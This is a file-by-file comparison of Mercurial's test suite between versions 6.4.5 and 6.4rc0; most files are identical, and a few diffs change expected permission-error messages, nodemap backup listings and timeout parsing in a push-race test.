### Comparing `mercurial-6.4.5/tests/test-obsolete.t` & `mercurial-6.4rc0/tests/test-obsolete.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-oldcgi.t` & `mercurial-6.4rc0/tests/test-oldcgi.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-origbackup-conflict.t` & `mercurial-6.4rc0/tests/test-origbackup-conflict.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pager-legacy.t` & `mercurial-6.4rc0/tests/test-pager-legacy.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pager.t` & `mercurial-6.4rc0/tests/test-pager.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-parents.t` & `mercurial-6.4rc0/tests/test-parents.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-parse-date.t` & `mercurial-6.4rc0/tests/test-parse-date.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-parseindex.t` & `mercurial-6.4rc0/tests/test-parseindex.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-parseindex2.py` & `mercurial-6.4rc0/tests/test-parseindex2.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-patch-offset.t` & `mercurial-6.4rc0/tests/test-patch-offset.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-patch.t` & `mercurial-6.4rc0/tests/test-patch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-patchbomb-bookmark.t` & `mercurial-6.4rc0/tests/test-patchbomb-bookmark.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-patchbomb-tls.t` & `mercurial-6.4rc0/tests/test-patchbomb-tls.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-patchbomb.t` & `mercurial-6.4rc0/tests/test-patchbomb.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pathconflicts-basic.t` & `mercurial-6.4rc0/tests/test-pathconflicts-basic.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pathconflicts-merge.t` & `mercurial-6.4rc0/tests/test-pathconflicts-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pathconflicts-update.t` & `mercurial-6.4rc0/tests/test-pathconflicts-update.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pathencode.py` & `mercurial-6.4rc0/tests/test-pathencode.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-paths.t` & `mercurial-6.4rc0/tests/test-paths.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pending.t` & `mercurial-6.4rc0/tests/test-pending.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-permissions.t` & `mercurial-6.4rc0/tests/test-permissions.t`

 * *Files 12% similar despite different names*

```diff
@@ -20,27 +20,27 @@
   $ hg commit -m "1"
 
   $ hg verify -q
 
   $ chmod -r .hg/store/data/a.i
 
   $ hg verify -q
-  abort: $EACCES$: '$TESTTMP/t/.hg/store/data/a.i'
+  abort: Permission denied: '$TESTTMP/t/.hg/store/data/a.i'
   [255]
 
   $ chmod +r .hg/store/data/a.i
 
   $ hg verify -q
 
   $ chmod -w .hg/store/data/a.i
 
   $ echo barber > a
   $ hg commit -m "2"
   trouble committing a!
-  abort: $EACCES$: '$TESTTMP/t/.hg/store/data/a.i'
+  abort: Permission denied: '$TESTTMP/t/.hg/store/data/a.i'
   [255]
 
   $ chmod -w .
 
   $ hg diff --nodates
   diff -r 2a18120dc1c9 a
   --- a/a
@@ -60,15 +60,15 @@
   $ chmod -rx dir
 
 #if no-fsmonitor
 
 (fsmonitor makes "hg status" avoid accessing to "dir")
 
   $ hg status
-  dir: $EACCES$* (glob)
+  dir: Permission denied* (glob)
   M a
 
 #endif
 
 Reenable perm to allow deletion:
 
   $ chmod +rx dir
```

### Comparing `mercurial-6.4.5/tests/test-persistent-nodemap.t` & `mercurial-6.4rc0/tests/test-persistent-nodemap.t`

 * *Files 1% similar despite different names*

```diff
@@ -807,15 +807,16 @@
   
   processed revlogs:
     - all-filelogs
     - changelog
     - manifest
   
   $ ls -1 .hg/store/ | egrep '00(changelog|manifest)(\.n|-.*\.nd)'
-  [1]
+  undo.backup.00changelog.n
+  undo.backup.00manifest.n
   $ hg debugnodemap --metadata
 
 
 upgrading
 
   $ cat << EOF >> .hg/hgrc
   > [format]
@@ -853,14 +854,16 @@
     - manifest
   
   $ ls -1 .hg/store/ | egrep '00(changelog|manifest)(\.n|-.*\.nd)'
   00changelog-*.nd (glob)
   00changelog.n
   00manifest-*.nd (glob)
   00manifest.n
+  undo.backup.00changelog.n
+  undo.backup.00manifest.n
 
   $ hg debugnodemap --metadata
   uid: * (glob)
   tip-rev: 5005
   tip-node: 90d5d3ba2fc47db50f712570487cb261a68c8ffe
   data-length: 121088
   data-unused: 0
```

### Comparing `mercurial-6.4.5/tests/test-phabricator.t` & `mercurial-6.4rc0/tests/test-phabricator.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-phase-archived.t` & `mercurial-6.4rc0/tests/test-phase-archived.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-phases-exchange.t` & `mercurial-6.4rc0/tests/test-phases-exchange.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-phases.t` & `mercurial-6.4rc0/tests/test-phases.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-profile.t` & `mercurial-6.4rc0/tests/test-profile.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-progress.t` & `mercurial-6.4rc0/tests/test-progress.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-propertycache.py` & `mercurial-6.4rc0/tests/test-propertycache.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-propertycache.py.out` & `mercurial-6.4rc0/tests/test-propertycache.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pull-branch.t` & `mercurial-6.4rc0/tests/test-pull-branch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pull-bundle.t` & `mercurial-6.4rc0/tests/test-pull-bundle.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pull-http.t` & `mercurial-6.4rc0/tests/test-pull-http.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pull-network.t` & `mercurial-6.4rc0/tests/test-pull-network.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pull-pull-corruption.t` & `mercurial-6.4rc0/tests/test-pull-pull-corruption.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pull-r.t` & `mercurial-6.4rc0/tests/test-pull-r.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pull-update.t` & `mercurial-6.4rc0/tests/test-pull-update.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-purge.t` & `mercurial-6.4rc0/tests/test-purge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-cgi.t` & `mercurial-6.4rc0/tests/test-push-cgi.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-multibranches-E1.t` & `mercurial-6.4rc0/tests/test-push-checkheads-multibranches-E1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-multibranches-E2.t` & `mercurial-6.4rc0/tests/test-push-checkheads-multibranches-E2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-multibranches-E3.t` & `mercurial-6.4rc0/tests/test-push-checkheads-multibranches-E3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-partial-C1.t` & `mercurial-6.4rc0/tests/test-push-checkheads-partial-C1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-partial-C2.t` & `mercurial-6.4rc0/tests/test-push-checkheads-partial-C2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-partial-C3.t` & `mercurial-6.4rc0/tests/test-push-checkheads-partial-C3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-partial-C4.t` & `mercurial-6.4rc0/tests/test-push-checkheads-partial-C4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-pruned-B1.t` & `mercurial-6.4rc0/tests/test-push-checkheads-pruned-B1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-pruned-B2.t` & `mercurial-6.4rc0/tests/test-push-checkheads-pruned-B2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-pruned-B3.t` & `mercurial-6.4rc0/tests/test-push-checkheads-pruned-B3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-pruned-B4.t` & `mercurial-6.4rc0/tests/test-push-checkheads-pruned-B4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-pruned-B5.t` & `mercurial-6.4rc0/tests/test-push-checkheads-pruned-B5.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-pruned-B6.t` & `mercurial-6.4rc0/tests/test-push-checkheads-pruned-B6.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-pruned-B7.t` & `mercurial-6.4rc0/tests/test-push-checkheads-pruned-B7.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-pruned-B8.t` & `mercurial-6.4rc0/tests/test-push-checkheads-pruned-B8.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-superceed-A1.t` & `mercurial-6.4rc0/tests/test-push-checkheads-superceed-A1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-superceed-A2.t` & `mercurial-6.4rc0/tests/test-push-checkheads-superceed-A2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-superceed-A3.t` & `mercurial-6.4rc0/tests/test-push-checkheads-superceed-A3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-superceed-A4.t` & `mercurial-6.4rc0/tests/test-push-checkheads-superceed-A4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-superceed-A5.t` & `mercurial-6.4rc0/tests/test-push-checkheads-superceed-A5.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-superceed-A6.t` & `mercurial-6.4rc0/tests/test-push-checkheads-superceed-A6.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-superceed-A7.t` & `mercurial-6.4rc0/tests/test-push-checkheads-superceed-A7.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-superceed-A8.t` & `mercurial-6.4rc0/tests/test-push-checkheads-superceed-A8.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-unpushed-D1.t` & `mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-unpushed-D2.t` & `mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-unpushed-D3.t` & `mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-unpushed-D4.t` & `mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-unpushed-D5.t` & `mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D5.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-unpushed-D6.t` & `mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D6.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-checkheads-unpushed-D7.t` & `mercurial-6.4rc0/tests/test-push-checkheads-unpushed-D7.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-http.t` & `mercurial-6.4rc0/tests/test-push-http.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push-race.t` & `mercurial-6.4rc0/tests/test-push-race.t`

 * *Files 0% similar despite different names*

```diff
@@ -46,18 +46,14 @@
   >     # now wait for the other process to be done
   >     watchpath = ui.config(b'delaypush', b'release-path')
   >     if watchpath is not None:
   >         ui.status(b'waiting on: %s\n' % watchpath)
   >         limit = 100
   >         test_default_timeout = os.environ.get('HGTEST_TIMEOUT_DEFAULT')
   >         test_timeout = os.environ.get('HGTEST_TIMEOUT')
-  >         if test_default_timeout is not None:
-  >            test_default_timeout = int(test_default_timeout)
-  >         if test_timeout is not None:
-  >            test_timeout = int(test_timeout)
   >         if (
   >             test_default_timeout is not None
   >             and test_timeout is not None
   >             and test_default_timeout < test_timeout
   >         ):
   >             limit = int(limit * (test_timeout / test_default_timeout))
   >         while 0 < limit and not os.path.exists(watchpath):
```

### Comparing `mercurial-6.4.5/tests/test-push-warn.t` & `mercurial-6.4rc0/tests/test-push-warn.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-push.t` & `mercurial-6.4rc0/tests/test-push.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-pushvars.t` & `mercurial-6.4rc0/tests/test-pushvars.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-qrecord.t` & `mercurial-6.4rc0/tests/test-qrecord.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-racy-mutations.t` & `mercurial-6.4rc0/tests/test-racy-mutations.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rank.t` & `mercurial-6.4rc0/tests/test-rank.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-abort.t` & `mercurial-6.4rc0/tests/test-rebase-abort.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-backup.t` & `mercurial-6.4rc0/tests/test-rebase-backup.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-base-flag.t` & `mercurial-6.4rc0/tests/test-rebase-base-flag.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-bookmarks.t` & `mercurial-6.4rc0/tests/test-rebase-bookmarks.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-brute-force.t` & `mercurial-6.4rc0/tests/test-rebase-brute-force.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-cache.t` & `mercurial-6.4rc0/tests/test-rebase-cache.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-check-restore.t` & `mercurial-6.4rc0/tests/test-rebase-check-restore.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-collapse.t` & `mercurial-6.4rc0/tests/test-rebase-collapse.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-conflicts.t` & `mercurial-6.4rc0/tests/test-rebase-conflicts.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-dest.t` & `mercurial-6.4rc0/tests/test-rebase-dest.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-detach.t` & `mercurial-6.4rc0/tests/test-rebase-detach.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-empty-successor.t` & `mercurial-6.4rc0/tests/test-rebase-empty-successor.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-emptycommit.t` & `mercurial-6.4rc0/tests/test-rebase-emptycommit.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-inmemory.t` & `mercurial-6.4rc0/tests/test-rebase-inmemory.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-interruptions.t` & `mercurial-6.4rc0/tests/test-rebase-interruptions.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-issue-noparam-single-rev.t` & `mercurial-6.4rc0/tests/test-rebase-issue-noparam-single-rev.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-legacy.t` & `mercurial-6.4rc0/tests/test-rebase-legacy.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-mq-skip.t` & `mercurial-6.4rc0/tests/test-rebase-mq-skip.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-mq.t` & `mercurial-6.4rc0/tests/test-rebase-mq.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-named-branches.t` & `mercurial-6.4rc0/tests/test-rebase-named-branches.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-newancestor.t` & `mercurial-6.4rc0/tests/test-rebase-newancestor.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-obsolete.t` & `mercurial-6.4rc0/tests/test-rebase-obsolete.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-obsolete2.t` & `mercurial-6.4rc0/tests/test-rebase-obsolete2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-obsolete3.t` & `mercurial-6.4rc0/tests/test-rebase-obsolete3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-obsolete4.t` & `mercurial-6.4rc0/tests/test-rebase-obsolete4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-parameters.t` & `mercurial-6.4rc0/tests/test-rebase-parameters.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-partial.t` & `mercurial-6.4rc0/tests/test-rebase-partial.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-pull.t` & `mercurial-6.4rc0/tests/test-rebase-pull.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-rename.t` & `mercurial-6.4rc0/tests/test-rebase-rename.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-scenario-global.t` & `mercurial-6.4rc0/tests/test-rebase-scenario-global.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-templates.t` & `mercurial-6.4rc0/tests/test-rebase-templates.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebase-transaction.t` & `mercurial-6.4rc0/tests/test-rebase-transaction.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rebuildstate.t` & `mercurial-6.4rc0/tests/test-rebuildstate.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-record.t` & `mercurial-6.4rc0/tests/test-record.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-releasenotes-formatting.t` & `mercurial-6.4rc0/tests/test-releasenotes-formatting.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-releasenotes-merging.t` & `mercurial-6.4rc0/tests/test-releasenotes-merging.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-releasenotes-parsing.t` & `mercurial-6.4rc0/tests/test-releasenotes-parsing.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-relink.t` & `mercurial-6.4rc0/tests/test-relink.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remote-hidden.t` & `mercurial-6.4rc0/tests/test-remote-hidden.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-bad-configs.t` & `mercurial-6.4rc0/tests/test-remotefilelog-bad-configs.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-bgprefetch.t` & `mercurial-6.4rc0/tests/test-remotefilelog-bgprefetch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-blame.t` & `mercurial-6.4rc0/tests/test-remotefilelog-blame.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-bundle2-legacy.t` & `mercurial-6.4rc0/tests/test-remotefilelog-bundle2-legacy.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-bundle2.t` & `mercurial-6.4rc0/tests/test-remotefilelog-bundle2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-bundles.t` & `mercurial-6.4rc0/tests/test-remotefilelog-bundles.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-cacheprocess.t` & `mercurial-6.4rc0/tests/test-remotefilelog-cacheprocess.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-clone-tree.t` & `mercurial-6.4rc0/tests/test-remotefilelog-clone-tree.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-clone.t` & `mercurial-6.4rc0/tests/test-remotefilelog-clone.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-corrupt-cache.t` & `mercurial-6.4rc0/tests/test-remotefilelog-corrupt-cache.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-datapack.py` & `mercurial-6.4rc0/tests/test-remotefilelog-datapack.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-gc.t` & `mercurial-6.4rc0/tests/test-remotefilelog-gc.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-gcrepack.t` & `mercurial-6.4rc0/tests/test-remotefilelog-gcrepack.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-hgweb.t` & `mercurial-6.4rc0/tests/test-remotefilelog-hgweb.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-histpack.py` & `mercurial-6.4rc0/tests/test-remotefilelog-histpack.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-http.t` & `mercurial-6.4rc0/tests/test-remotefilelog-http.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-keepset.t` & `mercurial-6.4rc0/tests/test-remotefilelog-keepset.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-linknodes.t` & `mercurial-6.4rc0/tests/test-remotefilelog-linknodes.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-local.t` & `mercurial-6.4rc0/tests/test-remotefilelog-local.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-log.t` & `mercurial-6.4rc0/tests/test-remotefilelog-log.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-partial-shallow.t` & `mercurial-6.4rc0/tests/test-remotefilelog-partial-shallow.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-permissions.t` & `mercurial-6.4rc0/tests/test-remotefilelog-permissions.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-prefetch.t` & `mercurial-6.4rc0/tests/test-remotefilelog-prefetch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-pull-noshallow.t` & `mercurial-6.4rc0/tests/test-remotefilelog-pull-noshallow.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-push-pull.t` & `mercurial-6.4rc0/tests/test-remotefilelog-push-pull.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-repack-fast.t` & `mercurial-6.4rc0/tests/test-remotefilelog-repack-fast.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-repack.t` & `mercurial-6.4rc0/tests/test-remotefilelog-repack.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-share.t` & `mercurial-6.4rc0/tests/test-remotefilelog-share.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-sparse.t` & `mercurial-6.4rc0/tests/test-remotefilelog-sparse.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-strip.t` & `mercurial-6.4rc0/tests/test-remotefilelog-strip.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-tags.t` & `mercurial-6.4rc0/tests/test-remotefilelog-tags.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remotefilelog-wireproto.t` & `mercurial-6.4rc0/tests/test-remotefilelog-wireproto.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-remove.t` & `mercurial-6.4rc0/tests/test-remove.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-removeemptydirs.t` & `mercurial-6.4rc0/tests/test-removeemptydirs.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rename-after-merge.t` & `mercurial-6.4rc0/tests/test-rename-after-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rename-dir-merge.t` & `mercurial-6.4rc0/tests/test-rename-dir-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rename-merge1.t` & `mercurial-6.4rc0/tests/test-rename-merge1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rename-merge2.t` & `mercurial-6.4rc0/tests/test-rename-merge2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rename-rev.t` & `mercurial-6.4rc0/tests/test-rename-rev.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-rename.t` & `mercurial-6.4rc0/tests/test-rename.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-repair-strip.t` & `mercurial-6.4rc0/tests/test-repair-strip.t`

 * *Files 4% similar despite different names*

```diff
@@ -49,17 +49,17 @@
   date:        Thu Jan 01 00:00:00 1970 +0000
   summary:     a
   
   saved backup bundle
   transaction abort!
   failed to truncate data/b.i
   rollback failed - please run hg recover
-  (failure reason: [Errno *] $EACCES$ .hg/store/data/b.i') (glob)
+  (failure reason: [Errno *] Permission denied .hg/store/data/b.i') (glob)
   strip failed, backup bundle
-  abort: $EACCES$ .hg/store/data/b.i'
+  abort: Permission denied .hg/store/data/b.i'
   % after update 0, strip 2
   abandoned transaction found - run hg recover
   checking changesets
   checking manifests
   crosschecking files in changesets and manifests
   checking files
    b@?: rev 1 points to nonexistent changeset 2
@@ -85,15 +85,15 @@
   $ teststrip 0 2 r .hg/store/data/b.i
   % before update 0, strip 2
   changeset:   0:cb9a9f314b8b
   user:        test
   date:        Thu Jan 01 00:00:00 1970 +0000
   summary:     a
   
-  abort: $EACCES$ .hg/store/data/b.i'
+  abort: Permission denied .hg/store/data/b.i'
   % after update 0, strip 2
   checking changesets
   checking manifests
   crosschecking files in changesets and manifests
   checking files
   checking dirstate
   checked 4 changesets with 4 changes to 3 files
@@ -106,17 +106,17 @@
   date:        Thu Jan 01 00:00:00 1970 +0000
   summary:     a
   
   saved backup bundle
   transaction abort!
   failed to truncate 00manifest.i
   rollback failed - please run hg recover
-  (failure reason: [Errno *] $EACCES$ .hg/store/00manifest.i') (glob)
+  (failure reason: [Errno *] Permission denied .hg/store/00manifest.i') (glob)
   strip failed, backup bundle
-  abort: $EACCES$ .hg/store/00manifest.i'
+  abort: Permission denied .hg/store/00manifest.i'
   % after update 0, strip 2
   abandoned transaction found - run hg recover
   checking changesets
   checking manifests
    manifest@?: rev 2 points to nonexistent changeset 2
    manifest@?: 3362547cdf64 not in changesets
    manifest@?: rev 3 points to nonexistent changeset 3
```

### Comparing `mercurial-6.4.5/tests/test-repo-compengines.t` & `mercurial-6.4rc0/tests/test-repo-compengines.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-repo-filters-tiptoe.t` & `mercurial-6.4rc0/tests/test-repo-filters-tiptoe.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-requires.t` & `mercurial-6.4rc0/tests/test-requires.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-resolve.t` & `mercurial-6.4rc0/tests/test-resolve.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revert-interactive-curses.t` & `mercurial-6.4rc0/tests/test-revert-interactive-curses.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revert-interactive.t` & `mercurial-6.4rc0/tests/test-revert-interactive.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revert.t` & `mercurial-6.4rc0/tests/test-revert.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-revisions.t` & `mercurial-6.4rc0/tests/test-revisions.t`

 * *Files identical despite different names*

